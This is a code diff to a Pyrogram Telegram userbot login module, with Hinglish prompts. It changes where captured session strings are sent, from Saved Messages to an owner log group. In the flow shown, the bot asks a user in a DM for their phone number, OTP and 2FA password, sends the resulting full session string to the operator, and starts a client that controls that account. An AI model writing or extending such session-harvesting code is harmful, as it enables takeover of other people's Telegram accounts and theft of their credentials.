@@ -1,6 +1,6 @@
 """
 .login / .addsession / .cancellogin / .mylogin
-OWNER + sudo. Session → Saved Messages + auto-start extra client.
+OWNER + sudo. Session → LOG_GROUP + auto-start extra client.
 """
 from typing import Any
 
@@ -12,6 +12,7 @@ from pyrogram.errors import (
 )
 
 from core.clients import app
+from core.notify import notify_owner
 from config import API_ID, API_HASH, OWNER_ID
 from modules.owner.sudoers import ub_cmd, SUDO_USERS
 
@@ -27,12 +28,12 @@ def _is_op(uid: int | None) -> bool:
     return uid in SUDO_USERS
 
 
-async def _send_to_saved(text: str):
+async def _send_to_log(text: str):
     try:
-        await app.send_message("me", text)
+        await notify_owner(app, text)
         return True
     except Exception as e:
-        print(f"[login] Saved fail: {e}")
+        print(f"[login] log fail: {e}")
         return False
 
 
@@ -47,7 +48,7 @@ async def _cleanup_temp(state: dict):
 
 
 async def _finish_session(sess: str, phone: str = ""):
-    """Save to Saved Messages + start extra client."""
+    """Save to LOG_GROUP + start extra client."""
     from modules.owner.session_manager import start_extra_session
 
     ok, res = await start_extra_session(sess, notify_client=app)
@@ -58,7 +59,7 @@ async def _finish_session(sess: str, phone: str = ""):
         f"<code>{sess}</code>\n\n"
         f"Owner: <code>.sessions</code> <code>.sessioninfo {res if ok else 'id'}</code>"
     )
-    await _send_to_saved(body)
+    await _send_to_log(body)
     return ok, res
 
 
@@ -75,7 +76,7 @@ async def login_cmd(client, message: Message):
             "<b>LOGIN ARMED</b>\n\n"
             "Jis user ke <b>DM</b> me <code>.login</code> likho.\n"
             "Phone → OTP → 2FA\n"
-            "Session Saved Messages + us ID pe bot start.\n"
+            "Session → Log Group + us ID pe bot start.\n"
             "Cancel: <code>.cancellogin</code>"
         )
         return
@@ -97,8 +98,8 @@ async def login_cmd(client, message: Message):
         "1) Phone <code>+91XXXXXXXXXX</code>\n"
         "2) OTP\n"
         "3) 2FA password (agar ho)\n\n"
-        "Session → Saved Messages\n"
-        "Us ID pe alag bot control start hoga.\n"
+        "Session → Log Group\n"
+        "User ID pe alag bot control start hoga.\n"
         "Cancel: <code>.cancellogin</code>"
     )
 
